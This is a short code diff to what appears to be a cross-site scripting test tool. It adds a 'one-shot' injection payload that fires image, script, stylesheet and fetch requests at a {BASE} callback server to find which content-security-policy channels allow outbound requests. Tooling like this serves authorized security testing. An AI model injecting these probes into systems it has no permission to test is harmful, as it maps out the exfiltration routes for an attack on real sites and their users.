@@ -1506,6 +1506,7 @@ function plParts(){
 }
 var PAYLOADS = [
   {sec:"Probe — connection check (copy & inject)", items:[
+    {n:"one-shot — all probes", d:"fires img+script+css+fetch together — Probe tab shows which channels pass", c:'<img src="{BASE}/probe?tag=img"><script src="{BASE}/probe.js?tag=script"><\/script><link rel="stylesheet" href="{BASE}/probe.css?tag=css"><script>fetch(\'{BASE}/probe?tag=fetch\',{mode:\'no-cors\'})<\/script>'},
     {n:"img probe", d:"JS-free — checks img-src only (1x1 GIF response)", c:'<img src="{BASE}/probe?tag=img">'},
     {n:"script probe", d:"checks script-src (no session created)", c:'<script src="{BASE}/probe.js?tag=script"><\/script>'},
     {n:"css probe", d:"checks style-src", c:'<link rel="stylesheet" href="{BASE}/probe.css?tag=css">'},
